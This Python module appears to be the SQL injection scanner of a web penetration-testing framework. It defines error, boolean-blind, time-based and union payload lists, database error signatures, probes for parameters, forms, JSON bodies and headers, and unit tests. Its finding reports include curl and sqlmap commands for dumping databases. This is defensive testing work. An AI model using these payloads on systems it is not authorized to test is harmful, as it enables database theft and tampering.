"""SQL Injection scanner — error-based, boolean-based blind, time-based, union-based."""
from __future__ import annotations

import asyncio
import re
import sys
import time
from pathlib import Path
from typing import Any

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.finding import Severity
from common.fp_reducer import FPReducer, Confidence

PAYLOADS_ERROR = [
    "'", '"', "';", '";', "' OR '1'='1", '" OR "1"="1',
    "' OR 1=1--", '" OR 1=1--', "' OR 1=1#", "1'", "1\"",
    "' AND 1=2--", "' AND SLEEP(0)--", "'; WAITFOR DELAY '0:0:0'--",
    "\\", "'\\", "1; SELECT 1--", "1' AND '1'='1",
    "') OR ('1'='1", "')) OR (('1'='1",
]

PAYLOADS_BOOLEAN_TRUE = [
    "' AND '1'='1",
    "' AND 1=1--",
    '" AND "1"="1',
    "' OR '1'='1' AND '1'='1",
    "1 AND 1=1",
    "1' AND 1=1--",
]

PAYLOADS_BOOLEAN_FALSE = [
    "' AND '1'='2",
    "' AND 1=2--",
    '" AND "1"="2',
    "' OR '1'='1' AND '1'='2",
    "1 AND 1=2",
    "1' AND 1=2--",
]

PAYLOADS_TIME = [
    # MySQL
    "' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "1; SELECT SLEEP(5)--",
    # MSSQL
    "'; WAITFOR DELAY '0:0:5'--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' AND 1=1; WAITFOR DELAY '0:0:5'--",
    # PostgreSQL
    "'; SELECT pg_sleep(5)--",
    "' AND 1=(SELECT 1 FROM pg_sleep(5))--",
    # Oracle
    "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
    # SQLite
    "' AND RANDOMBLOB(100000000/1)--",
]

PAYLOADS_UNION = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT 1,2,3--",
    "' UNION ALL SELECT 1,2,3,4--",
    "' UNION ALL SELECT 'sqli','test',3--",
]

DB_ERRORS: list[tuple[str, str]] = [
    # MySQL
    (r"SQL syntax.*MySQL",                          "MySQL"),
    (r"Warning.*mysql_",                            "MySQL"),
    (r"MySQLSyntaxErrorException",                  "MySQL"),
    (r"valid MySQL result",                         "MySQL"),
    (r"check the manual that corresponds to your (MySQL|MariaDB) server", "MySQL"),
    (r"Column count doesn't match value count",     "MySQL"),
    (r"com\.mysql\.jdbc",                           "MySQL"),
    (r"Syntax error or access violation",           "MySQL"),
    # Oracle
    (r"ORA-\d{5}",                                  "Oracle"),
    (r"Oracle error",                               "Oracle"),
    (r"Oracle.*Driver",                             "Oracle"),
    (r"Warning.*oci_",                              "Oracle"),
    (r"quoted string not properly terminated",      "Oracle"),
    # MSSQL
    (r"Microsoft SQL Server",                       "MSSQL"),
    (r"ODBC SQL Server Driver",                     "MSSQL"),
    (r"Incorrect syntax near",                      "MSSQL"),
    (r"Unclosed quotation mark after the character string", "MSSQL"),
    (r"com\.microsoft\.sqlserver",                  "MSSQL"),
    (r"\bSQLState\b",                               "MSSQL"),
    (r"MSSQL",                                      "MSSQL"),
    # PostgreSQL
    (r"pg_query\(\):.*ERROR",                       "PostgreSQL"),
    (r"unterminated quoted string at or near",      "PostgreSQL"),
    (r"PostgreSQL.*ERROR",                          "PostgreSQL"),
    (r"Warning.*pg_",                               "PostgreSQL"),
    (r"valid PostgreSQL result",                    "PostgreSQL"),
    (r"PSQLException",                              "PostgreSQL"),
    (r"org\.postgresql",                            "PostgreSQL"),
    # SQLite
    (r"SQLite3::",                                  "SQLite"),
    (r"SQLITE_ERROR",                               "SQLite"),
    (r"SQLite/JDBCDriver",                          "SQLite"),
    (r"System\.Data\.SQLite",                       "SQLite"),
    # DB2
    (r"DB2 SQL error",                              "DB2"),
    (r"com\.ibm\.db2",                              "DB2"),
    (r"SQLCODE",                                    "DB2"),
    # Sybase
    (r"Sybase message",                             "Sybase"),
    (r"com\.sybase\.jdbc",                          "Sybase"),
    # Generic
    (r"JDBC Driver",                                "JDBC"),
    (r"java\.sql\.SQLException",                    "Java/SQL"),
    (r"Zend_Db_Adapter_Exception",                  "PHP/Zend"),
    (r"Pdo[./\\]",                                  "PHP/PDO"),
    (r"Warning.*DBI::",                             "Perl/DBI"),
    (r"DriverManager\.getConnection",               "JDBC"),
    (r"500 Internal Server Error",                  "Generic (500 on injection)"),
]

CVSS_SQLI = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L"
CVSS40_SQLI = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N"
class SqliScanner(BaseModule):
    """SQL Injection scanner — tests all discovered parameters."""

    NAME        = "sqli_scanner"
    DESCRIPTION = "SQL injection: error-based, boolean blind, time-based, union detection"
    PHASE       = 4
    TAGS        = ["injection", "owasp-a03", "sqli", "cwe-89"]

    async def run(self) -> ModuleResult:
        """Scan target for SQL injection vulnerabilities."""
        start  = time.monotonic()
        target = self.config.target

        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        self.log.info("Starting SQL injection scan on %s", target)
        # Initialise FPReducer — binds ForgeCollab OOB client when available
        self._fp = FPReducer(
            collab_client=self.config.extra.get("collab_client"),
            headers=self.config.extra.get("session_headers", {}),
            time_delay=5.0,
            baseline_n=3,
        )

        from webforge.core.session import ForgeSession
        async with ForgeSession.from_config(self.config) as session:
            await self._test_url_params(session, target)

            # Test POST form bodies from crawler results
            for form in self.config.extra.get("found_forms", [])[:20]:
                await self._test_post_form(session, form, target)

            # Test JSON API endpoints
            for api_url in self.config.extra.get("api_endpoints", [])[:20]:
                await self._test_json_api(session, api_url, target)

            # Test HTTP headers that are often logged to DB (common SQLi vector)
            await self._test_header_injection(session, target)

        return self._make_result(start)

    async def _test_url_params(self, session: Any, url: str) -> None:
        """Test all URL parameters for SQL injection."""
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        if not params:
            return
        for param_name, param_values in params.items():
            await self._test_param(session, url, param_name, param_values[0] if param_values else "", "GET")

    async def _test_post_form(self, session: Any, form: dict, target: str) -> None:
        """Test POST form fields for SQL injection."""
        action  = form.get("action") or target
        inputs  = form.get("inputs", [])
        method  = form.get("method", "POST").upper()
        if method != "POST" or not inputs:
            return

        for field_name in inputs:
            for payload in PAYLOADS_ERROR[:8]:
                await self.rate_limit()
                data = {i: "test" for i in inputs}
                data[field_name] = payload
                try:
                    resp = await session.post(action, data=data)
                    body = await resp.text()
                    db_type = self._detect_db_error(body)
                    if db_type:
                        from common.evidence import Evidence
                        ev = Evidence(
                            request_raw=f"POST {action} | {field_name}={payload}",
                            response_raw=body[:2000],
                            extra={"field": field_name, "payload": payload, "db": db_type},
                        )
                        self.new_finding(
                            title=f"SQL Injection (POST) — Field '{field_name}' ({db_type})",
                            severity=Severity.CRITICAL,
                            description=(
                                f"SQL injection in POST form field '{field_name}' at {action}. "
                                f"{db_type} error triggered by payload: {payload!r}. "
                                "An attacker can extract, modify, or delete database contents."
                            ),
                            reproduction_steps=[
                                f"curl -X POST '{action}' -d '{field_name}={payload}'",
                                "Observe database error in response",
                                f"Use sqlmap: sqlmap -u '{action}' --data='{field_name}=1' --dbs",
                            ],
                            remediation="Use parameterized queries for all database operations.",
                            references=["CWE-89", "OWASP A03:2021"],
                            evidence=ev,
                            cvss_v31_vector=CVSS_SQLI,
                            cvss_v40_vector=CVSS40_SQLI,
                            mitre_attack=["TA0006/T1190"],
                            target=action,
                        )
                        return
                except Exception:
                    pass

    async def _test_json_api(self, session: Any, api_url: str, target: str) -> None:
        """Test JSON API endpoints — inject into string values in the JSON body."""
        import json as _json
        if not self.check_scope(api_url):
            return

        json_bodies = [
            {"id": "'"},
            {"id": "1'"},
            {"username": "'", "password": "test"},
            {"query": "' OR 1=1--"},
            {"search": "'"},
            {"filter": "' OR '1'='1"},
            {"sort": "1; SELECT SLEEP(0)--"},
        ]
        for body in json_bodies:
            await self.rate_limit()
            try:
                resp = await session.post(
                    api_url,
                    json=body,
                    headers={"Content-Type": "application/json"},
                )
                text = await resp.text()
                db_type = self._detect_db_error(text)
                if db_type:
                    from common.evidence import Evidence
                    self.new_finding(
                        title=f"SQL Injection (JSON API) — {api_url} ({db_type})",
                        severity=Severity.CRITICAL,
                        description=(
                            f"SQL injection via JSON body at {api_url}. "
                            f"{db_type} error on payload: {body}"
                        ),
                        reproduction_steps=[
                            f"curl -X POST '{api_url}' -H 'Content-Type: application/json' "
                            f"-d '{_json.dumps(body)}'",
                        ],
                        remediation="Use parameterized queries; validate JSON input at schema level.",
                        references=["CWE-89", "OWASP A03:2021"],
                        evidence=Evidence(
                            request_raw=f"POST {api_url} {_json.dumps(body)}",
                            response_raw=text[:1000],
                        ),
                        cvss_v31_vector=CVSS_SQLI,
                        cvss_v40_vector=CVSS40_SQLI,
                        target=api_url,
                    )
                    return
            except Exception:
                pass

    async def _test_header_injection(self, session: Any, target: str) -> None:
        """Test HTTP headers commonly logged to databases."""
        injectable_headers = {
            "X-Forwarded-For":          "' OR '1'='1",
            "User-Agent":               "' OR '1'='1",
            "Referer":                  "' OR 1=1--",
            "X-Custom-IP-Authorization":"' OR 1=1--",
            "X-Real-IP":                "' OR 1=1--",
            "Cookie":                   "session=' OR 1=1--",
        }
        for header, payload in injectable_headers.items():
            await self.rate_limit()
            try:
                resp = await session.get(target, headers={header: payload})
                body = await resp.text()
                db_type = self._detect_db_error(body)
                if db_type:
                    from common.evidence import Evidence
                    self.new_finding(
                        title=f"SQL Injection (Header) — {header} ({db_type})",
                        severity=Severity.HIGH,
                        description=(
                            f"SQL injection via HTTP header '{header}'. "
                            f"{db_type} error observed — header value is likely logged to DB. "
                        ),
                        reproduction_steps=[
                            f"curl '{target}' -H '{header}: {payload}'",
                        ],
                        remediation=(
                            "Sanitize/parameterize ALL data that reaches the database, "
                            "including HTTP headers and log values."
                        ),
                        references=["CWE-89", "OWASP A03:2021"],
                        evidence=Evidence(
                            request_raw=f"GET {target} | {header}: {payload}",
                            extra={"header": header, "payload": payload},
                        ),
                        cvss_v31_vector=CVSS_SQLI,
                        cvss_v40_vector=CVSS40_SQLI,
                        target=target,
                    )
                    return
            except Exception:
                pass

    async def _test_param(
        self, session: Any, url: str, param: str, original: str, method: str
    ) -> None:
        """Test a single parameter with error-based, boolean-blind, and time-based payloads."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

        # Get baseline response
        try:
            await self.rate_limit()
            baseline_resp = await session.get(url)
            baseline_body = await baseline_resp.text()
            baseline_len  = len(baseline_body)
            baseline_status = baseline_resp.status
        except Exception as exc:
            self.log.debug("Baseline request failed: %s", exc)
            return

        # 1. Error-based detection
        for payload in PAYLOADS_ERROR:
            await self.rate_limit()
            test_url = self._inject_param(url, param, payload)
            try:
                resp = await session.get(test_url)
                body = await resp.text()
                db_type = self._detect_db_error(body)
                if db_type:
                    # FPReducer: run 3-layer verification before reporting
                    fp_result = await self._fp.verify(
                        "sqli_error", url, param, method="GET", payloads=[payload, "''"]
                    )
                    if not self._fp.should_report(fp_result):
                        self.log.debug(
                            "SQLi error-based suppressed by FPReducer (%s): %s[%s]",
                            fp_result.confidence.value, url, param,
                        )
                        continue
                    finding_id = f"sqli_{param}_{db_type}".replace(" ", "_")
                    screenshot_path = self.capture_screenshot(
                        test_url, finding_id,
                        highlight_js="document.body.style.background='#fff0f0';"
                    )
                    from common.evidence import Evidence
                    ev = Evidence(
                        request_raw=f"GET {test_url}",
                        response_raw=body[:2000],
                        screenshot_path=screenshot_path,
                        extra={
                            "payload": payload, "param": param, "db_type": db_type,
                            "fp_confidence": fp_result.confidence.value,
                            "fp_evidence": fp_result.evidence,
                        },
                    )
                    self.new_finding(
                        title=f"SQL Injection — Parameter '{param}' ({db_type})",
                        severity=Severity.CRITICAL,
                        description=(
                            f"SQL injection vulnerability detected in parameter '{param}'. "
                            f"Database error from {db_type} was triggered by payload: {payload!r}. "
                            "An attacker can extract, modify, or delete database contents."
                        ),
                        reproduction_steps=[
                            f"Send GET request to: {test_url}",
                            f"Observe {db_type} database error in response",
                            f"Use sqlmap for full exploitation: sqlmap -u '{url}' -p {param} --dbs",
                        ],
                        remediation=(
                            "Use parameterized queries (prepared statements) for ALL database operations. "
                            "Never concatenate user input into SQL strings. "
                            "Apply input validation and least-privilege DB accounts."
                        ),
                        references=["CWE-89", "OWASP A03:2021", "https://owasp.org/Top10/A03_2021-Injection/"],
                        evidence=ev,
                        cvss_v31_vector=CVSS_SQLI,
                        cvss_v40_vector=CVSS40_SQLI,
                        mitre_attack=["TA0006/T1190"],
                        target=test_url,
                    )
                    return  # Found error-based, no need for further tests on this param
            except Exception as exc:
                self.log.debug("SQLi error-based test failed for %s=%s: %s", param, payload, exc)

        # 2. Boolean-based blind detection
        # Compare TRUE vs FALSE condition response sizes
        true_bodies: list[str] = []
        false_bodies: list[str] = []

        for pl_true, pl_false in zip(PAYLOADS_BOOLEAN_TRUE[:3], PAYLOADS_BOOLEAN_FALSE[:3]):
            try:
                await self.rate_limit()
                r_true = await session.get(self._inject_param(url, param, pl_true))
                body_true = await r_true.text()

                await self.rate_limit()
                r_false = await session.get(self._inject_param(url, param, pl_false))
                body_false = await r_false.text()

                true_bodies.append(body_true)
                false_bodies.append(body_false)
            except Exception:
                pass

        if true_bodies and false_bodies:
            true_avg  = sum(len(b) for b in true_bodies) / len(true_bodies)
            false_avg = sum(len(b) for b in false_bodies) / len(false_bodies)
            # TRUE condition should diverge from baseline; FALSE should stay close
            if abs(true_avg - false_avg) > 50 and abs(true_avg - baseline_len) > abs(false_avg - baseline_len):
                from common.evidence import Evidence
                ev = Evidence(
                    request_raw=f"GET {self._inject_param(url, param, PAYLOADS_BOOLEAN_TRUE[0])}",
                    extra={
                        "param":          param,
                        "baseline_len":   baseline_len,
                        "true_len_avg":   true_avg,
                        "false_len_avg":  false_avg,
                        "diff":           abs(true_avg - false_avg),
                    },
                )
                self.new_finding(
                    title=f"Boolean-Based Blind SQL Injection — Parameter '{param}'",
                    severity=Severity.CRITICAL,
                    description=(
                        f"Boolean-based blind SQL injection detected in parameter '{param}'. "
                        f"TRUE condition response ({true_avg:.0f} bytes) differs significantly from "
                        f"FALSE condition response ({false_avg:.0f} bytes), baseline: {baseline_len} bytes. "
                        "This allows data extraction byte-by-byte without visible errors."
                    ),
                    reproduction_steps=[
                        f"TRUE: GET {self._inject_param(url, param, PAYLOADS_BOOLEAN_TRUE[0])}",
                        f"FALSE: GET {self._inject_param(url, param, PAYLOADS_BOOLEAN_FALSE[0])}",
                        "Observe response length difference",
                        f"Automate: sqlmap -u '{url}' -p {param} --technique=B --dbs",
                    ],
                    remediation="Use parameterized queries for all database operations.",
                    references=["CWE-89", "OWASP A03:2021"],
                    evidence=ev,
                    cvss_v31_vector=CVSS_SQLI,
                    cvss_v40_vector=CVSS40_SQLI,
                    mitre_attack=["TA0006/T1190"],
                    target=url,
                )
                return

        # 3. UNION-based detection — probe column count then check for marker in response
        union_marker = "forge_sqli_union_marker"
        for payload in PAYLOADS_UNION:
            await self.rate_limit()
            marked = payload.replace("'sqli'", f"'{union_marker}'").replace("1,2,3", f"1,'{union_marker}',3")
            test_url = self._inject_param(url, param, marked)
            try:
                resp = await session.get(test_url)
                body = await resp.text()
                if union_marker in body:
                    from common.evidence import Evidence
                    ev = Evidence(
                        request_raw=f"GET {test_url}",
                        response_raw=body[:500],
                        extra={"payload": marked, "param": param, "marker_found": True},
                    )
                    self.new_finding(
                        title=f"UNION-Based SQL Injection — Parameter '{param}'",
                        severity=Severity.CRITICAL,
                        description=(
                            f"UNION-based SQL injection in parameter '{param}'. "
                            f"Payload '{marked}' reflected marker '{union_marker}' in response, "
                            "confirming query column count and data extraction capability."
                        ),
                        reproduction_steps=[
                            f"curl '{test_url}'",
                            f"# Automate: sqlmap -u '{url}' -p {param} --technique=U --dump",
                        ],
                        remediation="Use parameterized queries for all database operations.",
                        references=["CWE-89", "OWASP A03:2021"],
                        evidence=ev,
                        cvss_v31_vector=CVSS_SQLI,
                        cvss_v40_vector=CVSS40_SQLI,
                        mitre_attack=["TA0006/T1190"],
                        target=test_url,
                    )
                    return
            except Exception:
                pass

        # 4. Time-based blind detection
        for payload in PAYLOADS_TIME:
            await self.rate_limit()
            test_url = self._inject_param(url, param, payload)
            try:
                t_start = time.monotonic()
                resp = await session.get(test_url)
                await resp.text()
                elapsed = time.monotonic() - t_start
                if elapsed >= 4.5:  # 5s sleep with 0.5s tolerance
                    # FPReducer: re-probe with variant payloads to confirm time delay is genuine
                    fp_result = await self._fp.verify(
                        "sqli_time", url, param, method="GET"
                    )
                    if not self._fp.should_report(fp_result):
                        self.log.debug(
                            "SQLi time-based suppressed by FPReducer (%s): %s[%s]",
                            fp_result.confidence.value, url, param,
                        )
                        continue
                    from common.evidence import Evidence
                    ev = Evidence(
                        request_raw=f"GET {test_url}",
                        extra={
                            "payload": payload, "param": param, "delay_s": round(elapsed, 2),
                            "fp_confidence": fp_result.confidence.value,
                            "fp_evidence": fp_result.evidence,
                        },
                    )
                    self.new_finding(
                        title=f"Blind SQL Injection (Time-Based) — Parameter '{param}'",
                        severity=Severity.CRITICAL,
                        description=(
                            f"Time-based blind SQL injection detected in parameter '{param}'. "
                            f"Response delayed {elapsed:.1f}s with payload: {payload!r}. "
                            "This confirms SQL code execution even without visible error output."
                        ),
                        reproduction_steps=[
                            f"Send request to: {test_url}",
                            "Observe response delay of ~5 seconds",
                            f"Confirm: sqlmap -u '{url}' -p {param} --technique=T",
                        ],
                        remediation="Use parameterized queries for all database operations.",
                        references=["CWE-89", "OWASP A03:2021"],
                        evidence=ev,
                        cvss_v31_vector=CVSS_SQLI,
                        cvss_v40_vector=CVSS40_SQLI,
                        mitre_attack=["TA0006/T1190"],
                        target=test_url,
                    )
                    return
            except Exception:
                pass

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        """Inject payload into a specific URL parameter."""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [payload]
        new_query = urlencode({k: v[0] for k, v in params.items()})
        return urlunparse(parsed._replace(query=new_query))

    def _detect_db_error(self, body: str) -> str | None:
        """Check if response body contains database error signatures."""
        for pattern, db_type in DB_ERRORS:
            if re.search(pattern, body, re.IGNORECASE):
                return db_type
        return None


class TestSqliScanner:
    def test_detect_mysql_error(self) -> None:
        scanner = SqliScanner.__new__(SqliScanner)
        scanner.log = __import__("logging").getLogger("test")
        result = scanner._detect_db_error("Warning: mysql_fetch_array() expects parameter 1")
        assert result == "MySQL"

    def test_detect_mssql_error(self) -> None:
        scanner = SqliScanner.__new__(SqliScanner)
        scanner.log = __import__("logging").getLogger("test")
        result = scanner._detect_db_error("Incorrect syntax near '1'")
        assert result == "MSSQL"

    def test_detect_postgres_error(self) -> None:
        scanner = SqliScanner.__new__(SqliScanner)
        scanner.log = __import__("logging").getLogger("test")
        result = scanner._detect_db_error("unterminated quoted string at or near")
        assert result == "PostgreSQL"

    def test_detect_oracle_error(self) -> None:
        scanner = SqliScanner.__new__(SqliScanner)
        scanner.log = __import__("logging").getLogger("test")
        result = scanner._detect_db_error("ORA-00907: missing right parenthesis")
        assert result == "Oracle"

    def test_detect_no_error(self) -> None:
        scanner = SqliScanner.__new__(SqliScanner)
        scanner.log = __import__("logging").getLogger("test")
        result = scanner._detect_db_error("Hello World normal page")
        assert result is None

    def test_inject_param(self) -> None:
        scanner = SqliScanner.__new__(SqliScanner)
        url = "https://example.com/page?id=1&name=test"
        result = scanner._inject_param(url, "id", "' OR 1=1--")
        assert "id=" in result
        assert "name=test" in result

    def test_boolean_payloads_paired(self) -> None:
        assert len(PAYLOADS_BOOLEAN_TRUE) == len(PAYLOADS_BOOLEAN_FALSE)

    def test_time_payloads_cover_all_dbs(self) -> None:
        payloads_str = " ".join(PAYLOADS_TIME)
        assert "SLEEP" in payloads_str       # MySQL
        assert "WAITFOR" in payloads_str     # MSSQL
        assert "pg_sleep" in payloads_str    # PostgreSQL
